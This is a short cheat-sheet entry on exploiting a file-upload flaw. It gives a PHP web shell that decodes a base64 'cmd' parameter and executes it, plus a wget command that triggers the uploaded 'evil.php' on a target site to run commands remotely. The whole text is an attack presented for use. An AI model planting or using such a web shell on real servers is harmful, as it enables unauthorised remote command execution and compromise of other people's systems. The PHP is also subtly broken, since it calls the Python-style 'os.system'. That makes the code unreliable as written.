# Tricks

## File upload

Create php file,

```php
<?php
$cmd=$_GET["cmd"];
$decode=base64_decode($cmd);
os.system($decode);
?>
```

Then execute command on the web server,
```bash
wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo id|base64)
```

